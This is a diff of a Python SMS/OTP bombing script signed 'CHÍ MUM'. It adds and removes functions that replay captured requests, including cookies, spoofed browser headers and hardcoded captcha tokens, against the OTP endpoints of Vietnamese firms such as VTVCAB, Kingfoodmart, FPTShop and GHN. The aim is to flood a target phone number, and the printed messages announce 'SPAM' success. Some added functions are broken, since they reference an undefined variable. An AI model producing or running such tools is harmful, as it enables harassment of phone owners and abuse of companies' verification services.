@@ -70,41 +70,7 @@ formatted_device_id = format_device_id(random_id)
 #//////////////////////////
 import requests
 
-def send_otp_via_vtvcab(sdt):
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-        'authorization': '',
-        'content-type': 'application/json',
-        'origin': 'https://vtvcab.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://vtvcab.vn/',
-        'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
-    }
-
-    json_data = {
-        'phone': sdt,
-        'captchaToken': '0.IMEoirdkw_JKR0Q0FWu7WCQ4pkCmvjSv0lfYAiXMRfKTSGQ9FLn7SJFLZfOnmqsTIV7wv3O7zT3QL3GLTlZUnIy9GUWEPNlqpoA7WhyhY68AMWrMjjuJNnF2PT7UNA2DQgMQLD5-70JOeMwi1_rFkjO12lzbBKFTvucEXJhNWXMkYJWdVtNd8fnShBCskNPWIXfRptL1_dWlnoiYt15UNa8Vx4Gu6ivN2SAoF7IgcMPbsgT37weMqeW3QljvasmsExr7chwC2HZzU7PPwMhKxlWFpXKI1n6y86pUOcSK47rK43sFMZCN0KABC5g9PA_93mLNA20zRA4myslE4eKBTqd9xrwR_aSgRBvTpKm0oPmSkOPO3UIlp-ZGAtZjZKShHQa8qT-l-fifelEmXssFGkrIiQAt4itc32TrRCyrrQm6QrB2bzSz4n8cMsazQWFGgJBrT7dlNtsN8Ps9rdJAgQxPN7GEqwZzynnYhehbhbVJLMnVNC8LHXy71dhQM9JVIEkNDpdDtPhwdRo_fsmDOzp3efjDzHSEkNL5XRwmqQmC5n8wfhT6DF-d-IvXHoUR6zu6LkV9i8ujCaq9kryn3ptNtLlAoZkqUHQhd9KOoAUEH6vu2fEAiJtZl824xsz_KOXK1QhIVaR5AwqMAeDq13kOTzdQwDI7spSXXnGbtTR_sIUG5n_G0xuK5icYPenaJTilFKLaVBbO6lSQi0eyNKfO2N9aRa4UDx6SWr62uMVrnmN0KKm7L75peIwAgLpw9bxa8sicFttD79_jVM4jtRlf35ja4uPC6MvieYzws19T--VcBGhXoKzzLnAtuFUlfKda2M0bGgSvu_cGRkTg8L1nikkvkhMuh_J8aJ15cQDrLr1hTBJ8qhbHtAqaYkV6UQt0VtFah1lzhPzrrCsQbYjG45dCqdbzzhorVta-mX2swSFnFt90piyKdeRw3fcP.IIovgIHlYRu5oYkD7UyONg.f927a21d88d4336c27538fd54e123ff772a2cc5b1278113ef93e0a3c7df94676',
-    }
-
-    response = requests.post('https://apigateway.vtvcab.vn/mycab/api/v2/id/sync-otp', headers=headers, json=json_data)
-    try:
-        if response == True:
-            print(f'[BY: CHÍ MUM] ~ VTVCAB SPAM THÀNH CÔNG')
-        else:
-            print(f'[BY: CHÍ MUM] ~ VTVCAB SPAM THẤT BẠI')
-    except:
-        print(f'[BY: CHÍ MUM] ~ VTVCAB SPAM THẤT BẠI')
-
-
-
-def send_otp_via_cashbar(sdt):
+def send_otp_via_vinamilk(sdt):
     cookies = {
         '_gcl_au': '1.1.998139933.1720624574',
         '_ga': 'GA1.1.50287730.1720624578',
@@ -395,96 +361,84 @@ def send_otp_via_tv360(sdt):
 
 
 
-# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+# +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-def send_otp_via_dienmayxanh(sdt):
+def send_otp_via_kingfoodmartv1(sdt):
     cookies = {
-        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D',
-        '_gcl_gs': '2.1.k1$i1722078197',
-        '_gcl_au': '1.1.1611829968.1722078202',
-        '_pk_id.8.8977': '0cb4a8484e372aa4.1722078206.',
-        '_gcl_aw': 'GCL.1722078207.Cj0KCQjwtZK1BhDuARIsAAy2VzuN0p7BMri4YzOeVrmRZF82UOTa2C-_i_QpagDDIsqHo6h1DOlffIIaAt-9EALw_wcB',
-        '_ga': 'GA1.1.1672433188.1722078207',
-        '__zi': '2000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuHBJPyyZhgXabb2mJMDzUIPMKBEEOZ-hfnOIO0uYFIkdLX2WZG.1',
-        '_fbp': 'fb.1.1722078218028.559509456155849295',
-        'utm_source': 'cityads',
-        'utm_medium': 'cpa',
-        'utm_campaign': 'MjvvG5',
-        '_aff_network': 'cityads',
-        '_aff_sid': 'aqgZ22mTXBZ76M3',
-        'TBMCookie_3209819802479625248': '4462780017222238799AOLy9yE5q6nH1amg3l09l7YcWw=',
-        '___utmvm': '###########',
-        '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5T4vn_BRd2kD_-TRoCbYZazma9b_j4RDAFL8IO7rwClqDNL2lMM5nSamFCS7o5l1qjIoN9kdwtxgwxXX6oY6xgZIfO4EhCxYHb5TIbbOpQZ_PRgzLYKGkQiK5Llk4bIXLI',
-        'SvID': 'new26124|ZqcNG|ZqcNC',
-        '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1722223907%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
-        '_pk_ses.8.8977': '1',
-        '_ga_Y7SWKJEHCE': 'GS1.1.1722223906.4.0.1722223914.52.0.0',
-        '_ce.irv': 'returning',
-        'cebs': '1',
-        '_ce.clock_event': '1',
-        '_ce.clock_data': '2940%2C171.225.192.16%2C1%2Cb9cbd8dc13f19f9e7eb854f472bfa274%2CChrome%2CVN',
-        'cebsp_': '1',
-        '_ce.s': 'v~38cb32180cdce4003e7f4d90fa1e2b86c06284d7~lcw~1722223975023~lva~1722223918305~vpv~1~v11.cs~218102~v11.s~1e7547e0-4d5b-11ef-8fde-fdb33d105bee~v11.sla~1722223975014~gtrk.la~lz6fos3j~lcw~1722223975234',
+        '_gcl_au': '1.1.444462742.1775727948',
+        '_ga': 'GA1.1.523949221.1775727948',
+        '_ga_TZN092VLC1': 'GS2.1.s1775727947$o1$g1$t1775727954$j53$l0$h0',
+        '_ga_GS6YXJEMLX': 'GS2.1.s1775727948$o1$g1$t1775727954$j54$l0$h0',
     }
+
     headers = {
-        'Accept': '*/*',
-        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://www.dienmayxanh.com',
-        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-        'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'content-type': 'application/json',
+        'origin': 'https://kingfoodmart.com',
+        'priority': 'u=1, i',
+        'referer': 'https://kingfoodmart.com/',
+        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
+        'x-ol-tenant': 'kingfood',
+        # 'cookie': '_gcl_au=1.1.444462742.1775727948; _ga=GA1.1.523949221.1775727948; _ga_TZN092VLC1=GS2.1.s1775727947$o1$g1$t1775727954$j53$l0$h0; _ga_GS6YXJEMLX=GS2.1.s1775727948$o1$g1$t1775727954$j54$l0$h0',
     }
-    data = {
-        'phoneNumber': sdt,
-        'isReSend': 'false',
-        'sendOTPType': '1',
-        '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5QRnzdsOX6wJwBNHWxVAZkCdekJGPmWf83yiWIAWL7tng95WeRrzVVbDh0cGw2UXxEuk0o5Zu6ImdSLVigwXCZ41kqhGCo5NCw2oUiiJuQd2vEgpX-jSoqdyDTp_9iyBAs',
-    }
-    response = requests.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', cookies=cookies, headers=headers, data=data).json()
-    # print(response)
-    if response ['statusCode'] == 200:
-        print("[BY: CHÍ MUM] ~ ĐMX SPAM THÀNH CÔNG")
-    else:
-        print("[BY: CHÍ MUM] ~ ĐMX SPAM THẤT BẠI")
 
-
-
-def send_otp_via_kingfoodmart(sdt):
-    headers = {
-    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
-    'domain': 'kingfoodmart',
-    'sec-ch-ua-mobile': '?0',
-    'authorization': '',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-    'content-type': 'application/json',
-    'accept': '*/*',
-    'Referer': 'https://kingfoodmart.com/',
-    'sec-ch-ua-platform': '"Windows"',
-    }
     json_data = {
-        'operationName': 'SendOtp',
-        'variables': {
-            'input': {
-                'phone': sdt,
-                'captchaSignature': 'AWNCXZbkmtm8HOQPn3e-X5kQpLKbMAsrmlLAIhm2NBWvJStQYJ53ScQcbPQJS8o33FMyHYilnbdPtGcTr8ajL0ZA2QytqGB5tnIJsFZAFSPp-dfJKD5N1MQBZxqqp2xPcQfhYD30MZG-ingJCUGidN_b3Rc:U=2cffb4ffa0000000',
-            },
-        },
-        'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
+        'phone': sdt,
+        'captchaSignature': '0cAFcWeA4IiRyZNMSNLOsvQkOBptuG5JpO2I-cuV7Ma81h80Gs5I2PTpLYbp1ZGUNOd_wKS1eucx_pcGOwRpK2A0mDnf-UlhBdkmyojEnCyj2INe5oLgE1H7qJFw-VUeEe4Np9CBAqWLVqF1GF3sDjl5y7FPTJcqCe-mF2QrqHnmX7w1tBghFZuLnAfk0a0Czt0BSeOuTD21QFz43pJAAd0O4BK5eBIrzJYyHUVa-MdO7Ng2zjJvAHOsBus8OUuX2AC55WyIVNaYyjoUd0kA7GOdZHjGXLuAtqoLG_hLGBLJikkFjvmknCKLnF-aFK3pz0_hPXR6QD_fYuk0fVNtjl0Sp83Q2PsMRmxwFmqL84FEMIZMxMfpJdql7mKVJBX8Ndpnq-KENv3gciMOv9BsNZg9hA0kJBh58gAx83PouLBPFy0OzY4mSfDXaVAVo8laF60vKLRNsWKHlx_wDaJZpRRgauoCOiC0u5smUkZqnjCEDvmOFNxdKQLIqSfigrKVwyYNXBtO2CGdBtQlmKMwlu0iVuot5RvHwXBtrjWp47D2mNX-p_QSAUO7OY2CiKoFjnw9yMbWUhaiVF1eAVAxCJxKxppEe8xPA12mk7H9NjweVGvrA3dKLA1TqmhOTTSpF-3cmRtATZarddrtB5xkrTJmTk6OWDLBlU-oq9xWSiJSrmKBjdEPUg043psIZRvkMZXY0rxsbz3vo5Q-PyUlTEptEsEhCtqEtN1IeVmAVj4nkORwLQAgLZUDeLaJcDzSBCKb0qYrkoCI0wXaOnPnJ68X4vFCUWcd7i8IOjSmfgEoyalYDBhrge1AUa3ZNidoSpQ4xiPFAqbZz4cJDXTrscLu3mWoJMKM1jbOI3GDaQQo0owo7ngkNXSgtmlrncxcjtZOJZe7lii0-PewFYoJY6S_su6noSlrcZXmb5OJ7gvL2E0KsR1Jgtoluib9cm5-FEaxnConevMDjW99wJ5qpYgw70xvnWXVsFjMZsGaOi7Fev136vnV3wWXc2C1HFDe66mynfvAvOsJbpoRadT7ZtcTHRlSXd--wJWYtcc3O_cld2iL30EVjoVM7xhA-Swrt3sZy_27KFNDbiI5fe2oy7I0rjK1RxDbv5NIuh-0mkdTOBpk_K65vS5AYAj3d4YyaHBHGm9S0bopa9kI3MEllorB3vA7HjYKOCPzGegrSN6P42Dd4pb8hOjR845c09DZJ3n_PJ1AS0ibOlIvc3yY59n9xCqXPwBUiwRDeUNMgi2zf4UqhUBRV3DIuHUIYqlRfzoNQnO_W8a3wBwGEWI-apwy8qSq7XFwND-rao01FjDu3SEbyWngh0NQt7YwLTrbvwLRfgFNDt5SBw_TLCt_1ucTQ8yFOTO7oWf0mtvW9VRgLqy-3GlOSu6WuCrArdFfL90QVGBJVBkpFWxQv9bs-YsxjgMtAYbLs92x099Q284t014oWO3bY-ZGgvghAdBuXS_13KbgOvPy0qP_9tyqb8uNExW5YoOlGDglyWYuZTq7OUI_fVH24n_OnZSy2hIShx0-NCo347pQV236tumD49sqtwHpbgcEU_GRpfgOGPVovSOyhL-gtbHC-nU2HaorVeQltaMbzfbUHbCIlS7crjp0YdsXAavabj481sKZGtxCZWHacX7eJKnv8wDQzMH35Gg8IeFyGqCRDnqvf7KP7n5xwscfSjC1zy_t_pGudIAzzTruud5czFn-8RyAFHsRrRBs1K3Tcm1HC4zpO-X29q0NVYRVAdH4AipiQPYM0K-sO4ZifVIK4SY-iIpeem0szjqQG7QRQoaXI9INASqv-Q1fWnGjx_-x2d0WsJfPOgtMjk_QW0Ph0IaY579SBbPhx1itJAmYHY7RZ2tL2X2aUjUDXMktOB4X1BFr6roIydnSYvSZx3lHg1N1eUp_Iufn_TV8ZgSHISuE0Bc5cMHuE4xik8cKCHdPb2R3nymP46D0dGVKZybJc7r8zC7aoi-cnNNkBb9FpAhY7hm92-KeSNjtwAGKeC25TsGiL0GfatifYtS7tbhy35cnX2BTO00fXMrQ2Kzq1Y_Fnzr63M4k5ROYFnNWWC0Xqd74P8zZ02ozSQECSz-c-n4EiJ2a7maIm5ieA3mGgL8ZoM',
+        'method': 'ZALO',
     }
-    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data).json()
-    data2 = response['data']['sendOtp']
+
+    response = requests.post('https://onelife-api.kingfoodmart.com/v1/auth/send-otp', cookies=cookies, headers=headers, json=json_data)
     if data2 == None:
         print(f'[BY: CHÍ MUM] ~ KINGFOO SPAM THẤT BẠI')
     else:
         print(f'[BY: CHÍ MUM] ~ KINGFOO SPAM THÀNH CÔNG')
+
+def send_otp_via_kingfoodmartv2(sdt):
+    cookies = {
+        '_gcl_au': '1.1.444462742.1775727948',
+        '_ga': 'GA1.1.523949221.1775727948',
+        '_ga_TZN092VLC1': 'GS2.1.s1775727947$o1$g1$t1775727954$j53$l0$h0',
+        '_ga_GS6YXJEMLX': 'GS2.1.s1775727948$o1$g1$t1775727954$j54$l0$h0',
+    }
+
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'content-type': 'application/json',
+        'origin': 'https://kingfoodmart.com',
+        'priority': 'u=1, i',
+        'referer': 'https://kingfoodmart.com/',
+        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
+        'x-ol-tenant': 'kingfood',
+    # 'cookie': '_gcl_au=1.1.444462742.1775727948; _ga=GA1.1.523949221.1775727948; _ga_TZN092VLC1=GS2.1.s1775727947$o1$g1$t1775727954$j53$l0$h0; _ga_GS6YXJEMLX=GS2.1.s1775727948$o1$g1$t1775727954$j54$l0$h0',
+    }
+
+    json_data = {
+        'phone': sdt,
+        'captchaSignature': '0cAFcWeA4Ws-GVkFyEgC3Io-CaUrRTfUwRrjNi5jaObcXuyjZ-8G332k8oqPKvtBDu0avxLlQtPU-HZxYwsoreJ0ecHKP4Id1FTR-BAJZQSCGBo98l2t-wqPB3P0F_7iYwENarwHbMMKjw-EFGaiH8s2iltwyl56-3SOPHDi5wwA0F-U38jS8AdnbKSa4suMaU9GyarEhXdiiyezxZsMgrfsAPhj7sRyBBojRHCPcOO-biCALIRkl5f8UbbXDJKEm6Qs4WXgIwsroc4Ux36StrI55haBIB09WmQ4SV97Gadv9rXImG0FPGC5psau_t9Tq9acaBWX0VW8IbAgxKWYGbqHEtIsIpWs25hMdghCMTFTwDwHzgiwGZOei-okNKb4Lwfzd3RH-iq_8nEhaK6GzpI8og3pmdXi-0Afw9MKlZNFzjAntWZXLLKRzVi4iAm6slLlRfu7i4WtE1drN2QdHmex_UR1YRQj2TsWauuYlLmE-x62NNwAS301nVtmT81a8xyGQqcxmcnEbf9sSWgg8D_-mZLoirYHJhJmlVdig_h_PbEvNCGV5OixZ0rErR8127zQYbnJlcYRyAq6bKCYH3eofYuIHthIneut_rMSDnNB_GqLfwhE8e3AfLUPIKuB9cZyp-FgPf8DUORu0SZ8GiiRsqvAv162i9zJs6YhkDIn6ikZU6yjuM2C3Uu9mDbc1bnJYx9bjDAYqKAvGnw-9BVhOk8bMS0VLY-EJiqYcYFzxQYuNyjXsQ7XWCluMytiTygKKsSFTvVCAIJPGoJ1Ml-AieOIcYxnvkk5nUUmE6ACp6iSe7ULPgCXLdSC73a-yjlOpdMx4FyA-rp5lgwBlKPrJo4MSVB64rMgqjc9n-339aSkdSsHhwdkJYdtzMqVzR52drPXWKO39mLPjAE6U9Q7RHEImMe3ExJvQgQ7UfIBGr4QX8JaEXa3bYOTvJCywErXBh6muMmPzvUOV-OZj6lyPg6rqE8i5VpAx8s53_pKdoNde0NrVBy8sEWO0jsSjaRyFjbeoE0t1JKwOjloe93zZiM5HynEkHZQlTjY_9w9Hxf15UmjiL6KtEuRzxm7uCU-d4ba9g1-krWyX9JcSC8xpFiS06mczP1yL62VsJtpLy-WxQFt9WEYlgo2ywXFWNtc9oaUtnvz-AE6i33S1tgPM-OxxenpATtgqyEVJ_G_EVrxd5O8sf6C1-Q8RxyM_nuhQTvnbzoA7eb_904yvLcEa12zVA-5hdnWGYX-xsFqBcdj_TsmU1agC9l5OwWwGfh4I8wrQxL2u8Cag74bcOi9rYZ_kmnyGHWFrCQ4g4JIIH0syyWLcWqN7cei6JxJVqJLm90jAAV4Eh546E129NgWAaUAq3MHZD5o9aSSt7xDgZj1AVOCHkcHX8u6pv876wKSWeOuOyRfSNHutZOz5Ev5fK2ymyA1KTvsNkHtjmPVMqVME6sMOd7jkA2z97n1WGjBzW-YdDMW3NZwhn3jIzKToLDtSe3TyRwKih03-usCIBjkBkQoK4cM5Jv9q8VEbo3WV6LpT_ZpPfhfM1upDSG1Rr1grWHCqYefXkMxAYWk0lGujR1P2nka3nOgqSkD8NMcpP8S06oU4mfWyX9dsoTSrsI1Du4gZwJe1ZnYjeODDn9isHiySsWvyBm-N-o8cjmSDcsOlG05bTSP8IwUPjmWcVVWT1vKGxT-JnybJtZNoKdgbcmWztTZ69-mkwUUOXF2q2_X-DGkZ1z3NIEdSCSSTM0QJX3T7OYcAJGKm4zfTTi4gTCw7XPVZG0oyYkf-Y1ZzLW7sL0N8wtD77D50uIifNzwQhcD2Wnk8ikKHBEYt2TDCp0pnu_UQsb_nQh0xlK_8YE-7sGrJgJlCz9Qdmuty2f8L0EC07FgNH-Q0RNFvFy7VD_EPSz9GH-c9Co4fZxNrjtVxLgObFfotH6LC4BCvSjtGEKASzNyN9IfKhX6TpCEKz2118rrI0txFyM9HVcbYRVFTiOOsnH6QQvgXft-Zh-aw6QaH124ZVNp6OYrPmtsxBEQrEpWmT6EIyIuSP5qjk73qxlGcIMWUsJbJz0x8YRuh5x-0HoxzoLxHYBlM2wfhvTb_Rbcd3REkscyObV54WE_7FbcRgw9Lt7XxhGWrnWhHzV0wrRCrjSzBUgBA2i2cqHvplwl0ENGV-0G5lUBImyqjQudux',
+        'method': 'SMS',
+    }
+
+    response = requests.post('https://onelife-api.kingfoodmart.com/v1/auth/send-otp', cookies=cookies, headers=headers, json=json_data)
+    if data2 == None:
+        print(f'[BY: CHÍ MUM] ~ KINGFOOD SPAM THẤT BẠI')
+    else:
+        print(f'[BY: CHÍ MUM] ~ KINGFOOD SPAM THÀNH CÔNG')
+
 
 
 def send_otp_via_mocha(sdt):
@@ -515,125 +469,6 @@ def send_otp_via_mocha(sdt):
 
 
     print("OTP SEND modcha:", response.json)
-
-def send_otp_via_fptdk(sdt):
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/json; charset=UTF-8',
-        'dnt': '1',
-        'origin': 'https://fptplay.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://fptplay.vn/',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-        'x-did': 'A0EB7FD5EA287DBF',
-    }
-
-    json_data = {
-        'phone': sdt,
-        'country_code': 'VN',
-        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
-    }
-
-    response = requests.post(
-        'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&amp;e=1722340953&amp;device=Microsoft%20Edge(version%253A127.0.0.0)&amp;drm=1',
-        headers=headers,
-        json=json_data,
-    )
-    print("OTP SEND FPT SPAM THÀNH CÔNG ")
-
-def send_otp_via_fptmk(sdt): # lÃ&nbsp; quÃªn pass á»Ÿ fps Ã¡
-    headers = {
-        'authority': 'papi.fptshop.com.vn',
-        'accept': '*/*',
-        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
-        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
-        'content-type': 'application/json',
-        'order-channel': '1',
-        'origin': 'https://fptshop.com.vn',
-        'referer': 'https://fptshop.com.vn/',
-        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-    }
-    json_data = {
-        'fromSys': 'WEBKHICT',
-        'otpType': '0',
-        'phoneNumber': sdt,
-    }
-    response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data).json()
-    try:
-        chi_mum = response['error']['details']
-        if chi_mum == None:
-            print(f'[BY: CHÍ MUM] ~ FPTSHOP SPAM THẤT BẠI')
-        else:
-            print(f'[BY: CHÍ MUM] ~ FPTSHOP SPAM THÀNH CÔNG')
-    except:
-        print(f'[BY: CHÍ MUM] ~ FPTSHOP SPAM THÀNH CÔNG')
-
-
-def send_otp_via_VIEON(sdt):
-    headers = {
-        'authority': 'batdongsan.com.vn',
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
-        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
-        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-    }
-    params = {
-        'phoneNumber': sdt,
-    }
-    response = requests.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', params=params, headers=headers,).json()
-    try:
-        if response ['data'] == 'success':
-            print(f'[BY: CHÍ MUM] ~ BATDONGSAN SPAM THÀNH CÔNG')
-        else:
-            print(f'[BY: CHÍ MUM] ~ BATDONGSAN SPAM THẤT BẠI')
-    except:
-        print(f'[BY: CHÍ MUM] ~ BATDONGSAN SPAM THẤT BẠI')
-
-def send_otp_via_ghn(sdt):
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/json',
-        'dnt': '1',
-        'origin': 'https://sso.ghn.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://sso.ghn.vn/',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-    }
-
-    json_data = {
-        'phone': sdt,
-        'type': 'register',
-    }
-
-    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
-    print("OTP SEND GHN EXPRESS :", response.text)
-
 
 def send_otp_via_lottemart(sdt):
 
@@ -895,55 +730,6 @@ def send_otp_via_WinMart(sdt):
     except:
         print(f'[BY: CHÍ MUM] ~ WINMART SPAM THẤT BẠI')
 
-def send_otp_via_vietloan(sdt):
-    cookies = {
-        '__cfruid': '05dded470380675f852d37a751c7becbfec7f394-1722345991',
-        'XSRF-TOKEN': 'eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQitnL2xScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1YzZmNzMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D',
-        'sessionid': 'eyJpdiI6IjBmbkMwd0JZenpMMnN2eDJiMmZjdGc9PSIsInZhbHVlIjoiTjl6U0NmZ213cjV1MG9VZEZhVHFkK2JDLzNiL1paaTR6dXhCM085a0gzTWhuSjhhUnhMNTNhb0wrNGtqM2U1OHF6UWNOMS9RcUxPWVdHR1NyUmt6OWtzcEVVd25DM3RiUUhOZWlXYTBiOG4rY0tKTUMrZGhHMGJPTlVqaDM1ME0iLCJtYWMiOiI2ZDcwNTQ5Mjg5M2Q0ZjYyOGQxOGJlZmQxZjEwYjY5NmY5ZTU5MTM1YjUzNGYzMDk3YmUyMTQ4YTcyNGE2OWFmIiwidGFnIjoiIn0%3D',
